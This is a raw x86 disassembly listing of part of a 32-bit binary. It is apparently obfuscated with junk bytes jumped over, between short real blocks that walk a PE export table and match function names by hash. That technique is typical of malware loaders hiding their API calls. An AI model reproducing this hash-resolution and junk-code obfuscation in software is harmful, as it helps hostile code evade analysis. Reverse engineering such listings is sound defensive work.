  40b8ef:	fbld   TBYTE PTR [esp+esi*1-0x15d71a70]
  40b8f6:	or     al,0xfa
  40b8f8:	jmp    0x61b9:0x818c5744
  40b8ff:	dec    ecx
  40b900:	leave  
  40b901:	push   ecx
  40b902:	push   ecx
  40b903:	push   ebp
  40b904:	or     DWORD PTR [eax+eiz*8],ebp
  40b907:	and    eax,DWORD PTR [esi+0x7caab799]
  40b90d:	repz adc al,0x2c
  40b910:	(bad)  
  40b911:	cmp    eax,0x7523e1a1
  40b916:	into   
  40b917:	imul   esi,DWORD PTR [edx],0x78
  40b91a:	cli    
  40b91b:	mov    ch,0xf2
  40b91d:	in     eax,dx
  40b91e:	xor    eax,0x8b773ddd
  40b923:	inc    edi
  40b924:	cmp    BYTE PTR [edi],cl
  40b926:	outs   dx,DWORD PTR ds:[esi]
  40b927:	mov    dh,0x92
  40b929:	jo     0x40b98e
  40b92b:	repnz clc 
  40b92d:	pop    ecx
  40b92e:	jl     0x40b95d
  40b930:	add    al,BYTE PTR [eax-0x303b2ba5]
  40b936:	leave  
  40b937:	pop    esi
  40b938:	scas   eax,DWORD PTR es:[edi]
  40b939:	mov    DWORD PTR [ebp-0x2c],ecx
  40b93c:	mov    eax,DWORD PTR [ebp-0x14]
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	cld    
  40b965:	hlt    
  40b966:	push   eax
  40b967:	imul   edi,DWORD PTR [ecx+0x33],0x7eb67e7e
  40b96e:	jle    0x40b9ee
  40b970:	cli    
  40b971:	fimul  WORD PTR [edx+0x53]
  40b974:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b975:	jl     0x40b983
  40b977:	retf   0xd4a6
  40b97a:	xchg   BYTE PTR ss:[eax+0x6d4da2b8],ch
  40b981:	lea    edi,[esi-0x76]
  40b984:	out    dx,al
  40b985:	and    bh,cl
  40b987:	cdq    
  40b988:	jge    0x40b9d2
  40b98a:	dec    edx
  40b98b:	push   ecx
  40b98c:	hlt    
  40b98d:	cmp    cl,bh
  40b98f:	jne    0x40b92a
  40b991:	jno    0x40b95d
  40b993:	mov    ch,0x3c
  40b995:	jl     0x40b9f5
  40b997:	pop    ecx
  40b998:	ins    DWORD PTR es:[edi],dx
  40b999:	jnp    0x40b96e
  40b99b:	adc    ecx,esp
  40b99d:	test   DWORD PTR [edx+0x4b],ebp
  40b9a0:	scas   eax,DWORD PTR es:[edi]
  40b9a1:	mov    esp,0x178b224c
  40b9a6:	nop
  40b9a7:	fidivr DWORD PTR [edi+0x4c]
  40b9aa:	jne    0x40b9f4
  40b9ac:	repz push edx
  40b9ae:	inc    ecx
  40b9af:	test   al,0x51
  40b9b1:	imul   esi,DWORD PTR [ecx],0x56374a84
  40b9b7:	xchg   edx,eax
  40b9b8:	sub    dl,BYTE PTR [edx-0x28441f10]
  40b9be:	fcomp  st(3)
  40b9c0:	in     eax,dx
  40b9c1:	jb     0x40b96a
  40b9c3:	fisub  DWORD PTR [edx]
  40b9c5:	inc    esp
  40b9c6:	jmp    0x7db7:0x99adcaa2
  40b9cd:	sbb    ebx,edx
  40b9cf:	jno    0x40b955
  40b9d1:	(bad)  
  40b9d2:	fsub   DWORD PTR ds:0xcdb4a2ce
  40b9d8:	sahf   
  40b9d9:	or     al,0x8d
  40b9db:	leave  
  40b9dc:	add    al,0xae
  40b9de:	in     al,dx
  40b9df:	int    0x59
  40b9e1:	cld    
  40b9e2:	adc    DWORD PTR [ebp+0x6ab88c6f],ebp
  40b9e8:	add    BYTE PTR [edi+0x1e],dl
  40b9eb:	test   BYTE PTR [edi+ebp*1-0x25276722],dh
  40b9f2:	xchg   esi,eax
  40b9f3:	popa   
  40b9f4:	xchg   DWORD PTR [eax],ebx
  40b9f6:	shl    eax,1
  40b9f8:	call   0x867c:0xd8618cab
  40b9ff:	mov    dh,0x36
  40ba01:	sub    bl,bh
  40ba03:	inc    eax
  40ba04:	cdq    
  40ba05:	retf   0x3963
  40ba08:	dec    ecx
  40ba09:	in     al,dx
  40ba0a:	add    DWORD PTR [ecx+0x49dcaae5],esi
  40ba10:	xor    al,0xa2
  40ba12:	dec    ebp
  40ba13:	mov    dh,0x3f
  40ba15:	or     al,0x89
  40ba17:	cs (bad) 
  40ba19:	fdivr  QWORD PTR [edi]
  40ba1b:	shl    bl,1
  40ba1d:	jle    0x40ba9d
  40ba1f:	aad    0xda
  40ba21:	mov    DWORD PTR [edx],edi
  40ba23:	loope  0x40ba79
  40ba25:	data16 mov bh,0x4e
  40ba28:	scas   eax,DWORD PTR es:[edi]
  40ba29:	mov    edx,0x4a456b29
  40ba2e:	push   eax
  40ba2f:	das    
  40ba30:	cmp    eax,0x80107e37
  40ba35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba36:	lahf   
  40ba37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock sar BYTE PTR [ebx+0x31],cl
  40ba76:	(bad)  
  40ba77:	mov    cl,0x30
  40ba79:	jle    0x40baf9
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	sbb    DWORD PTR [edx],edx
  40ba81:	xchg   ecx,eax
  40ba82:	div    DWORD PTR [esp+eax*4+0x78825c00]
  40ba89:	dec    ebp
  40ba8a:	out    dx,al
  40ba8b:	and    al,0xdd
  40ba8d:	fiadd  DWORD PTR [edx+esi*8]
  40ba90:	inc    esi
  40ba91:	jmp    0x40baf4
  40ba93:	push   ss
  40ba94:	and    eax,0x28ead832
  40ba99:	jmp    0x402cc60
  40ba9e:	pop    ebp
  40ba9f:	(bad)  
  40baa1:	jmp    0xe01d:0x7a0b306e
  40baa8:	stos   DWORD PTR es:[edi],eax
  40baa9:	repnz popa 
  40baab:	and    ch,BYTE PTR [esp+ebp*4]
  40baae:	pop    edx
  40baaf:	mov    dl,0xab
  40bab1:	inc    esp
  40bab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab3:	fld    QWORD PTR [ebx+0x76]
  40bab6:	xchg   BYTE PTR [eax-0x1cd55d20],ch
  40babc:	mov    ebx,0xf58416f4
  40bac1:	dec    edi
  40bac2:	repz pop ebp
  40bac4:	fdivr  QWORD PTR [eax+0x7a]
  40bac7:	out    dx,al
  40bac8:	push   edi
  40bac9:	xchg   edi,eax
  40baca:	and    DWORD PTR [edi],eax
  40bacc:	iret   
  40bacd:	repnz sbb cl,ch
  40bad0:	and    al,0x2e
  40bad2:	adc    DWORD PTR [ebx+0x6c7a94be],ebp
  40bad8:	xor    al,0xfd
  40bada:	mov    bl,0xcf
  40badc:	push   edi
  40badd:	sbb    eax,0xe1def13a
  40bae2:	fdivr  QWORD PTR [esi]
  40bae4:	push   esi
  40bae5:	imul   esp,DWORD PTR [edx-0x3c],0x554f8fc8
  40baec:	lods   al,BYTE PTR ds:[esi]
  40baed:	sub    BYTE PTR [eax+0x3ef9c4bd],ch
  40baf3:	hlt    
  40baf4:	and    dl,0x6a
  40baf7:	sub    BYTE PTR [edx-0x1a],0xd8
  40bafb:	fwait
  40bafc:	xchg   BYTE PTR [edi+0x64],cl
  40baff:	sahf   
  40bb00:	adc    DWORD PTR [ecx-0x6e52155c],ebp
  40bb06:	mov    ebp,0xf6f5811b
  40bb0b:	cs cwde 
  40bb0d:	mov    eax,0xe0a78e28
  40bb12:	enter  0x9cb9,0x2a
  40bb16:	pop    ebx
  40bb17:	mov    ebp,0xa53d0749
  40bb1c:	test   DWORD PTR [eax-0x28],esi
  40bb1f:	push   ebp
  40bb20:	mov    al,ds:0xf32bcbcd
  40bb25:	cmp    al,0x68
  40bb27:	pop    ss
  40bb28:	xchg   al,cl
  40bb2a:	mov    bl,0x0
  40bb2c:	sbb    bl,BYTE PTR [ebp-0x32758faa]
  40bb32:	rcr    BYTE PTR [esi+ecx*2-0x50],0x5a
  40bb37:	xor    DWORD PTR [ebx+0x20],0x9574d3a0
  40bb3e:	xor    BYTE PTR [edi+0x2f8f078e],ah
  40bb44:	das    
  40bb45:	xchg   BYTE PTR [edi+0x47],bl
  40bb48:	cmp    edi,eax
  40bb4a:	jb     0x40b2a5
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	rcr    DWORD PTR [eax],1
  40bbc3:	sar    BYTE PTR [esi-0x77],0x31
  40bbc7:	jle    0x40bc47
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	(bad)  
  40bbcf:	mov    ds:0xbbe4edd7,al
  40bbd4:	jns    0x40bb89
  40bbd6:	or     DWORD PTR [edi+0x4d],ebp
  40bbd9:	ds aam 0x54
  40bbdc:	jae    0x40bb76
  40bbde:	test   eax,0x6f5f8e10
  40bbe3:	mov    edx,ecx
  40bbe5:	jp     0x40bc24
  40bbe7:	pop    ebx
  40bbe8:	lds    esp,FWORD PTR [ecx]
  40bbea:	ins    BYTE PTR es:[edi],dx
  40bbeb:	daa    
  40bbec:	call   0xa503ea35
  40bbf1:	inc    edi
  40bbf2:	gs push esi
  40bbf4:	mov    dh,0xdd
  40bbf6:	xor    al,0x32
  40bbf8:	inc    esi
  40bbf9:	ja     0x40bbc1
  40bbfb:	gs stos DWORD PTR es:[edi],eax
  40bbfd:	mov    ecx,0x398e19e0
  40bc02:	sub    eax,0x3a6b9fd1
  40bc07:	fwait
  40bc08:	repz and ecx,ecx
  40bc0b:	retf   
  40bc0c:	jg     0x40bbf9
  40bc0e:	dec    esi
  40bc0f:	test   DWORD PTR [ecx-0x7f6e2ef7],0x2f5010e
  40bc19:	add    eax,0x51711e3
  40bc1e:	sub    DWORD PTR [ebx+0x4e78f1b3],edx
  40bc24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc25:	imul   edi,DWORD PTR [esi+0xecfa153],0xdec6c4a4
  40bc2f:	inc    ebp
  40bc30:	mov    ebx,0x9d1f6516
  40bc35:	sbb    al,0x26
  40bc37:	adc    eax,DWORD PTR [edx]
  40bc39:	mov    ds:0x946d9c22,eax
  40bc3e:	sbb    dh,BYTE PTR [ecx+0x7a]
  40bc41:	fucomp st(2)
  40bc43:	clc    
  40bc44:	out    0xcd,eax
  40bc46:	rcl    BYTE PTR [ebx],1
  40bc48:	mul    DWORD PTR [ebx+ecx*1-0x64]
  40bc4c:	jnp    0x40bcb7
  40bc4e:	push   ebx
  40bc4f:	loope  0x40bc5d
  40bc51:	mov    esi,DWORD PTR [ebx]
  40bc53:	and    DWORD PTR [ecx],esi
  40bc55:	arpl   WORD PTR fs:[ebx],cx
  40bc58:	cld    
  40bc59:	sub    edx,ecx
  40bc5b:	mov    BYTE PTR [ecx+ecx*2],dh
  40bc5e:	in     eax,0x71
  40bc60:	xchg   ebx,eax
  40bc61:	pop    ebp
  40bc62:	mov    cl,BYTE PTR [ebp-0x55]
  40bc65:	daa    
  40bc66:	scas   al,BYTE PTR es:[edi]
  40bc67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc68:	std    
  40bc69:	xchg   edi,edi
  40bc6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc6c:	stos   DWORD PTR es:[edi],eax
  40bc6d:	outs   dx,DWORD PTR ds:[esi]
  40bc6e:	test   eax,0x5c9e583c
  40bc73:	test   BYTE PTR [edi],dl
  40bc75:	pop    ebp
  40bc76:	mov    ecx,0x189eeebe
  40bc7b:	test   eax,0xcac103b5
  40bc80:	imul   DWORD PTR [eax]
  40bc82:	addr16 push 0xffffffc5
  40bc85:	mov    ebp,0x94fac49a
  40bc8a:	test   al,0x7e
  40bc8c:	popf   
  40bc8d:	mov    gs,edi
  40bc8f:	(bad)  
  40bc90:	pop    ebx
  40bc91:	ss mov ebp,0x875bbe81
  40bc97:	retf   
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	inc    esi
  40bcc2:	and    DWORD PTR [eax+0x15],0x7e7e36c1
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	or     ch,dl
  40bccf:	sbb    BYTE PTR [edx+0x6f05e55],bl
  40bcd5:	xor    bh,0xcc
  40bcd8:	xlat   BYTE PTR ds:[ebx]
  40bcd9:	jle    0x40bd51
  40bcdb:	cmp    al,0x35
  40bcdd:	xor    eax,0x75b08157
  40bce2:	sub    ebp,DWORD PTR [edi]
  40bce4:	in     eax,0x98
  40bce6:	int3   
  40bce7:	daa    
  40bce8:	outs   dx,DWORD PTR ds:[esi]
  40bce9:	or     al,0xff
  40bceb:	lock aaa 
  40bced:	in     eax,dx
  40bcee:	or     esi,DWORD PTR [ecx+edi*2-0xb]
  40bcf2:	and    edx,eax
  40bcf4:	aam    0xd
  40bcf6:	inc    esi
  40bcf7:	retf   
  40bcf8:	push   eax
  40bcf9:	repnz xlat BYTE PTR ds:[ebx]
  40bcfb:	retf   0xeea3
  40bcfe:	add    eax,0xb90cd182
  40bd03:	jl     0x40bcbb
  40bd05:	ss jmp 0x40bd03
  40bd08:	mov    edi,fs
  40bd0a:	dec    ecx
  40bd0b:	pop    ebx
  40bd0c:	inc    DWORD PTR [edx]
  40bd0e:	stos   DWORD PTR es:[edi],eax
  40bd0f:	cmp    BYTE PTR [eax+ecx*2+0x6f],dh
  40bd13:	sub    edx,DWORD PTR [esi]
  40bd15:	xor    edi,DWORD PTR [edx-0x2a]
  40bd18:	scas   eax,DWORD PTR es:[edi]
  40bd19:	xor    ecx,DWORD PTR [ebp+0x4e9bdafa]
  40bd1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd20:	inc    ebx
  40bd21:	(bad)  
  40bd23:	pop    ebx
  40bd24:	test   BYTE PTR [ebx],al
  40bd26:	and    DWORD PTR [ebp+0xf],esp
  40bd29:	jae    0x40bd75
  40bd2b:	outs   dx,BYTE PTR ds:[esi]
  40bd2c:	mov    eax,ds:0xadb3c7f6
  40bd31:	pop    edx
  40bd32:	xor    edx,DWORD PTR [ebx+0x19]
  40bd35:	das    
  40bd36:	push   0x9793f8a5
  40bd3b:	pop    esi
  40bd3c:	xor    eax,0x4b5aca2a
  40bd41:	lea    edi,[ebp-0x26]
  40bd44:	or     esi,ebx
  40bd46:	out    0x8d,eax
  40bd48:	dec    esi
  40bd49:	jnp    0x40bd05
  40bd4b:	pusha  
  40bd4c:	dec    eax
  40bd4d:	mov    DWORD PTR [ecx+0x13],esi
  40bd50:	loop   0x40bd26
  40bd52:	and    DWORD PTR [ecx+0x573609a5],0x1b
  40bd59:	retf   
  40bd5a:	addr16 push ds
  40bd5c:	and    eax,0xca3d6db7
  40bd61:	cwde   
  40bd62:	sbb    eax,0xe2c4bff1
  40bd67:	jp     0x40bd42
  40bd69:	fdivr  QWORD PTR [esi-0x5b0d2bce]
  40bd6f:	sub    al,0xcc
  40bd71:	mov    dl,0xee
  40bd73:	jge    0x40bdf2
  40bd75:	stos   DWORD PTR es:[edi],eax
  40bd76:	jmp    0x68e6:0x8e5593c0
  40bd7d:	(bad)  
  40bd7e:	das    
  40bd7f:	lods   al,BYTE PTR ds:[esi]
  40bd80:	inc    esi
  40bd81:	sbb    al,0xca
  40bd83:	es pop ss
  40bd85:	mov    esp,0x8997afe7
  40bd8a:	loop   0x40bdad
  40bd8c:	push   esp
  40bd8d:	hlt    
  40bd8e:	sub    BYTE PTR [edi+0x7e952086],dl
  40bd94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd95:	xor    eax,ecx
  40bd97:	mov    edx,0x32729f
  40bd9c:	add    eax,edx
  40bd9e:	mov    DWORD PTR [ebp+0x8],eax
  40bda1:	mov    eax,DWORD PTR [ebp-0x18]
  40bda4:	xor    eax,ecx
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	imul   edi,esp,0xffffffdf
  40bdbf:	mov    dl,0x19
  40bdc1:	aaa    
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	jno    0x40bdec
  40bdca:	das    
  40bdcb:	sahf   
  40bdcc:	add    ebp,DWORD PTR [edx]
  40bdce:	ret    
  40bdcf:	imul   esp,DWORD PTR [esi-0x64],0x7184af2a
  40bdd6:	xchg   DWORD PTR [esi-0x7a59dee],ebp
  40bddc:	or     al,0x6e
  40bdde:	inc    esi
  40bddf:	push   ecx
  40bde0:	aam    0xda
  40bde2:	add    eax,0x67b1729f
  40bde7:	cmp    DWORD PTR [edx+0x400312f8],ecx
  40bded:	add    al,0x84
  40bdef:	lock (bad) 
  40bdf2:	mov    BYTE PTR [esi+esi*1],bl
  40bdf5:	mov    dl,0xfe
  40bdf7:	jp     0x40bdba
  40bdf9:	xchg   edi,eax
  40bdfa:	clc    
  40bdfb:	fcomp  DWORD PTR [eax+0x38]
  40bdfe:	mov    bh,0x6b
  40be00:	mov    bl,0xca
  40be02:	add    eax,0xa613fe9d
  40be07:	aas    
  40be08:	enter  0x90f9,0x9c
  40be0c:	pop    ss
  40be0d:	retf   
  40be0e:	xor    ebp,DWORD PTR [ecx+0x6ced1128]
  40be14:	inc    ebp
  40be15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be16:	xchg   bl,bh
  40be18:	daa    
  40be19:	out    0x15,eax
  40be1b:	sub    BYTE PTR es:[esi],dl
  40be1e:	pop    ss
  40be1f:	pop    ss
  40be20:	lods   al,BYTE PTR ds:[esi]
  40be21:	int    0x4b
  40be23:	sbb    edx,DWORD PTR [ebp+0x48]
  40be26:	and    eax,0xf281fea7
  40be2b:	mov    cl,0x91
  40be2d:	push   es
  40be2e:	or     cl,ah
  40be30:	(bad)  
  40be32:	mov    ebp,DWORD PTR [esi]
  40be34:	push   eax
  40be35:	xchg   ebp,eax
  40be36:	add    al,0x36
  40be38:	(bad)  
  40be39:	out    0x9b,al
  40be3b:	aam    0x4c
  40be3d:	cdq    
  40be3e:	sub    eax,0xf92f0b8b
  40be43:	rcl    DWORD PTR [edi+0x4a],cl
  40be46:	aam    0xa7
  40be48:	nop
  40be49:	in     eax,dx
  40be4a:	inc    edi
  40be4b:	mov    edi,0xe6f8b8e1
  40be50:	retf   0x89d6
  40be53:	sbb    eax,0xe9a47206
  40be58:	adc    edi,DWORD PTR [edx+eiz*2+0x3af69c0e]
  40be5f:	das    
  40be60:	dec    esi
  40be61:	rcl    DWORD PTR [edx+0x393d3ad2],0x5d
  40be68:	jle    0x40be77
  40be6a:	dec    esi
  40be6b:	stos   BYTE PTR es:[edi],al
  40be6c:	cld    
  40be6d:	adc    BYTE PTR [ecx],bh
  40be6f:	push   0x31
  40be71:	mov    eax,0x85f92f45
  40be76:	pop    esp
  40be77:	popa   
  40be78:	or     al,0x24
  40be7a:	mov    ebp,0x41dcc505
  40be7f:	iret   
  40be80:	jg     0x40bef7
  40be82:	loope  0x40be35
  40be84:	push   cs
  40be85:	pop    esi
  40be86:	outs   dx,BYTE PTR ds:[esi]
  40be87:	loopne 0x40bed9
  40be89:	and    al,0x2f
  40be8b:	fucompp 
  40be8d:	push   es
  40be8e:	aas    
  40be8f:	aad    0xf
  40be91:	scas   eax,DWORD PTR es:[edi]
  40be92:	add    ch,cl
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0x14147640
  40bea6:	pop    ecx
  40bea7:	inc    eax
  40bea8:	push   ecx
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	mov    bh,0x80
  40beb2:	cmp    eax,0xb71f0e3b
  40beb7:	sahf   
  40beb8:	nop
  40beb9:	repnz pop ss
  40bebb:	repz jmp 0x3acc:0x465e0840
  40bec3:	mov    ds:0x79a473ef,al
  40bec8:	mov    esp,DWORD PTR [edi]
  40beca:	jp     0x40bf03
  40becc:	mov    WORD PTR [ebp-0x38703361],cs
  40bed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bed3:	xlat   BYTE PTR ds:[ebx]
  40bed4:	fistp  WORD PTR [edi]
  40bed6:	jp     0x40be6d
  40bed8:	sbb    eax,DWORD PTR [ecx+0x5b25ec28]
  40bede:	add    eax,0x8d9cbd65
  40bee3:	dec    edi
  40bee4:	mov    esp,DWORD PTR [ebp+0x3f681ec0]
  40beea:	sub    eax,0x49449642
  40beef:	mov    bh,0xb9
  40bef1:	push   es
  40bef2:	inc    esi
  40bef3:	and    DWORD PTR [edx+0x5d],0x1e04fbb4
  40befa:	mov    bh,cl
  40befc:	or     eax,0x26b89fc5
  40bf01:	pop    ecx
  40bf02:	jl     0x40bef5
  40bf04:	push   ss
  40bf05:	sar    DWORD PTR [edx-0x443b3993],1
  40bf0b:	pop    edx
  40bf0c:	mov    esp,0xaf7ccc6
  40bf11:	mov    cl,0xe8
  40bf13:	and    bl,dl
  40bf15:	mov    cl,0x3d
  40bf17:	mov    edi,0xf45fd4e1
  40bf1c:	and    dl,cl
  40bf1e:	add    ebp,DWORD PTR [edi+edx*4-0x75]
  40bf22:	inc    esi
  40bf23:	jmp    0x8ef5:0x36fa295e
  40bf2a:	push   edi
  40bf2b:	hlt    
  40bf2c:	inc    DWORD PTR [ebp+0x1e602343]
  40bf32:	out    0xf6,al
  40bf34:	mov    esi,0xd9a1faef
  40bf39:	rol    DWORD PTR [eax+0x2145bbf1],0x8f
  40bf40:	icebp  
  40bf41:	test   eax,0xe3c74306
  40bf46:	pop    eax
  40bf47:	test   cl,0xf0
  40bf4a:	jl     0x40bf2c
  40bf4c:	push   es
  40bf4d:	lea    edx,[esi-0x6a]
  40bf50:	xchg   edi,eax
  40bf51:	out    dx,eax
  40bf52:	jmp    0x40bfb6
  40bf54:	and    dh,ah
  40bf56:	ins    DWORD PTR es:[edi],dx
  40bf57:	cmp    edx,0x1d44fbd0
  40bf5d:	out    dx,eax
  40bf5e:	repnz mov ah,BYTE PTR [ebx-0x70]
  40bf62:	adc    al,0x5
  40bf64:	sbb    dl,al
  40bf66:	stc    
  40bf67:	ins    BYTE PTR es:[edi],dx
  40bf68:	cwde   
  40bf69:	hlt    
  40bf6a:	adc    bl,bl
  40bf6c:	icebp  
  40bf6d:	cmp    edi,DWORD PTR [ecx-0x1f23c3a7]
  40bf73:	add    BYTE PTR [esi-0x74717438],cl
  40bf79:	push   ebp
  40bf7a:	cld    
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	cdq    
  40bfae:	neg    dh
  40bfb0:	or     eax,0x7e7e34a9
  40bfb5:	mov    dh,0x7e
  40bfb7:	jle    0x40c037
  40bfb9:	sbb    eax,0x6968971e
  40bfbe:	ds sub eax,0xc71837bc
  40bfc4:	add    DWORD PTR [edi+0x779a70bb],esp
  40bfca:	push   cs
  40bfcb:	adc    ch,BYTE PTR ds:0x9addaffc
  40bfd1:	inc    DWORD PTR [esi-0x2e760566]
  40bfd7:	sar    DWORD PTR [ebp-0x789ac4b],1
  40bfdd:	add    BYTE PTR [esi],dl
  40bfdf:	sahf   
  40bfe0:	push   esp
  40bfe1:	fcmovbe st,st(7)
  40bfe3:	push   ss
  40bfe4:	aas    
  40bfe5:	jmp    0x9417b350
  40bfea:	fmul   DWORD PTR [ecx]
  40bfec:	arpl   bp,bp
  40bfee:	jo     0x40bfc9
  40bff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bff1:	xchg   esi,eax
  40bff2:	dec    esp
  40bff3:	push   ss
  40bff4:	mov    esp,0x931e1223
  40bff9:	bound  ebp,QWORD PTR [edx+0x680f4494]
  40bfff:	inc    DWORD PTR [eax]
  40c001:	sbb    al,0x35
  40c003:	imul   eax,DWORD PTR [esi+0x14da53a9],0xba21f466
  40c00d:	in     al,0x2d
  40c00f:	inc    eax
  40c010:	test   eax,0x252a81fb
  40c015:	xor    BYTE PTR [ecx+edi*8-0x63],dl
  40c019:	inc    ebx
  40c01a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c01b:	popf   
  40c01c:	popa   
  40c01d:	scas   al,BYTE PTR es:[edi]
  40c01e:	or     BYTE PTR [edx+0x46752a],dl
  40c024:	and    esp,esi
  40c026:	(bad)  
  40c027:	or     eax,0x5e04528d
  40c02c:	in     eax,dx
  40c02d:	icebp  
  40c02e:	push   ebp
  40c02f:	in     eax,0x7f
  40c031:	push   eax
  40c032:	loope  0x40c003
  40c034:	push   esi
  40c035:	arpl   WORD PTR [ebp+0x32],ax
  40c038:	pop    ss
  40c039:	test   BYTE PTR [ebp-0x12],cl
  40c03c:	imul   BYTE PTR [ebx-0x80]
  40c03f:	dec    eax
  40c040:	cdq    
  40c041:	rcr    BYTE PTR [ebp-0x2ba7f6eb],0xdb
  40c048:	stos   BYTE PTR es:[edi],al
  40c049:	loop   0x40c01b
  40c04b:	shl    BYTE PTR [esi-0x33],cl
  40c04e:	pop    es
  40c04f:	pop    ebp
  40c050:	clc    
  40c051:	lods   al,BYTE PTR ds:[esi]
  40c052:	out    0x5,eax
